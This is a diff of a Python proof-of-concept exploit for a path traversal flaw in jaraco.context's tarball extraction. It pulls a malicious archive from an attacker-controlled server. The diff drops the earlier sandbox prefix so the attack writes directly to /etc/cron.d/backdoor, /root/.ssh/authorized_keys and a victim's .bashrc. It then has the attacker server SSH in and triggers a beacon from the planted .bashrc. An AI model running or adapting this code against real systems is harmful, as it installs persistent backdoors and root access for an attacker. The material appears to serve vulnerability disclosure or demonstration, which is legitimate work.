@@ -8,50 +8,74 @@ triggering the strip_first_component vulnerability.
 
 import os
 import sys
-import shutil
-
-# Ensure we use setuptools' vendored jaraco
-SETUPTOOLS_VENDOR = os.environ.get('SETUPTOOLS_VENDOR', '/usr/local/lib/python3.12/site-packages/setuptools/_vendor')
-if os.path.exists(SETUPTOOLS_VENDOR):
-    sys.path.insert(0, SETUPTOOLS_VENDOR)
+import time
+import urllib.request
+import subprocess
 
 SERVER_HOST = os.environ.get('SERVER_HOST', 'server')
 SERVER_PORT = os.environ.get('SERVER_PORT', '8080')
-DEMO_PREFIX = os.environ.get('DEMO_PREFIX', '/tmp/demo')
+
+TARGET_DIRS = ["/etc/cron.d", "/root/.ssh", "/home/victim"]
 
 
-def run_attack(scenario='cron'):
+def setup_environment():
+    """Create target directories."""
+    print("[VICTIM] Creating target directories...")
+    for d in TARGET_DIRS:
+        os.makedirs(d, exist_ok=True)
+
+
+def wait_for_server(host, port, timeout=30):
+    """Wait for the malicious server to be ready."""
+    import socket
+    print(f"[VICTIM] Waiting for server {host}:{port}...")
+    start = time.time()
+    while time.time() - start < timeout:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            if sock.connect_ex((host, int(port))) == 0:
+                sock.close()
+                print("[VICTIM] Server is up!")
+                return True
+            sock.close()
+        except:
+            pass
+        time.sleep(1)
+    return False
+
+
+def run_attack(scenario):
     """Execute the tarball path traversal attack."""
+    # Import here to use the installed setuptools
     from jaraco.context import tarball
 
-    # Target paths based on scenario
     targets = {
-        'cron': f'{DEMO_PREFIX}/etc/cron.d/backdoor',
-        'ssh': f'{DEMO_PREFIX}/root/.ssh/authorized_keys',
-        'bashrc': f'{DEMO_PREFIX}/home/victim/.bashrc',
+        'cron': '/etc/cron.d/backdoor',
+        'ssh': '/root/.ssh/authorized_keys',
+        'bashrc': '/home/victim/.bashrc',
     }
+    target = targets[scenario]
 
-    target = targets.get(scenario, targets['cron'])
-
-    # Ensure parent directories exist for the demo
-    os.makedirs(os.path.dirname(target), exist_ok=True)
-
-    # Clean up previous runs
-    if os.path.exists(target):
-        os.remove(target)
-
-    print("=" * 60)
+    print(f"\n{'='*60}")
     print(f"EXECUTING ATTACK: {scenario.upper()}")
-    print("=" * 60)
-    print()
+    print(f"{'='*60}")
+
+    # Set scenario on server
+    try:
+        urllib.request.urlopen(f"http://{SERVER_HOST}:{SERVER_PORT}/scenario/{scenario}")
+    except:
+        pass
+    time.sleep(0.5)
 
     url = f"http://{SERVER_HOST}:{SERVER_PORT}/package.tar.gz"
-    print(f"[VICTIM] Fetching tarball from: {url}")
+    print(f"\n[VICTIM] Fetching tarball from: {url}")
     print(f"[VICTIM] Expected extraction to: /tmp/safe_directory/")
+    print(f"[VICTIM] Actual target: {target}")
     print()
 
     try:
-        # This is what a legitimate user might do
+        # This is what a legitimate user might do - extract to a "safe" directory
         with tarball(url, target_dir="/tmp/safe_directory") as extracted:
             print(f"[VICTIM] Extraction returned: {extracted}")
             print(f"[VICTIM] Contents of {extracted}:")
@@ -81,35 +105,74 @@ def run_attack(scenario='cron'):
         return False
 
 
+def validate():
+    """Validate attack impact."""
+    print(f"\n{'='*60}")
+    print("VALIDATION")
+    print(f"{'='*60}")
+
+    # SSH validation - ask server to SSH in
+    if os.path.exists("/root/.ssh/authorized_keys"):
+        print("\n[SSH] authorized_keys exists:")
+        with open("/root/.ssh/authorized_keys") as f:
+            content = f.read()
+            print(content[:200] if len(content) > 200 else content)
+        print("\n[*] Asking attacker server to SSH in...")
+        try:
+            resp = urllib.request.urlopen(
+                f"http://{SERVER_HOST}:{SERVER_PORT}/validate/ssh",
+                timeout=15
+            )
+            result = resp.read().decode()
+            if "SSH_OK" in result:
+                print("[!] ATTACKER SUCCESSFULLY SSH'd INTO VICTIM!")
+            else:
+                print(f"[-] SSH validation response: {result[:200]}")
+        except Exception as e:
+            print(f"[-] SSH validation failed: {e}")
+
+    # Cron validation
+    if os.path.exists("/etc/cron.d/backdoor"):
+        print("\n[CRON] backdoor cron job installed:")
+        with open("/etc/cron.d/backdoor") as f:
+            print(f.read())
+
+    # Bashrc validation - trigger the beacon
+    if os.path.exists("/home/victim/.bashrc"):
+        print("\n[BASHRC] backdoor exists, triggering beacon...")
+        try:
+            subprocess.run(
+                ["bash", "-c", "source /home/victim/.bashrc"],
+                capture_output=True,
+                timeout=5
+            )
+            time.sleep(2)
+            print("[*] Check server /status for beacon callback")
+        except Exception as e:
+            print(f"[-] Bashrc trigger failed: {e}")
+
+
 def main():
-    print()
     print("=" * 60)
-    print("TARBALL PATH TRAVERSAL VICTIM")
+    print("TARBALL PATH TRAVERSAL ATTACK")
     print("jaraco/context.py strip_first_component bypass")
     print("=" * 60)
     print()
     print(f"Server: {SERVER_HOST}:{SERVER_PORT}")
-    print(f"Demo prefix: {DEMO_PREFIX}")
     print()
 
-    # Create demo directories
-    os.makedirs(f"{DEMO_PREFIX}/etc/cron.d", exist_ok=True)
-    os.makedirs(f"{DEMO_PREFIX}/root/.ssh", exist_ok=True)
-    os.makedirs(f"{DEMO_PREFIX}/home/victim", exist_ok=True)
+    setup_environment()
+
+    if not wait_for_server(SERVER_HOST, int(SERVER_PORT)):
+        print("[VICTIM] Server not reachable")
+        sys.exit(1)
+
+    time.sleep(1)
 
     results = {}
-
-    # Switch to cron scenario and run
-    import urllib.request
     for scenario in ['cron', 'ssh', 'bashrc']:
-        try:
-            urllib.request.urlopen(f"http://{SERVER_HOST}:{SERVER_PORT}/scenario/{scenario}")
-        except:
-            pass
-
-        print()
         results[scenario] = run_attack(scenario)
-        print()
+        time.sleep(1)
 
     # Summary
     print()
@@ -119,6 +182,14 @@ def main():
     for scenario, success in results.items():
         status = "[EXPLOITED]" if success else "[FAILED]"
         print(f"  {status} {scenario}")
+
+    # Validate the attacks worked
+    validate()
+
+    print()
+    print("=" * 60)
+    print("COMPLETE")
+    print("=" * 60)
 
     return 0 if any(results.values()) else 1
 
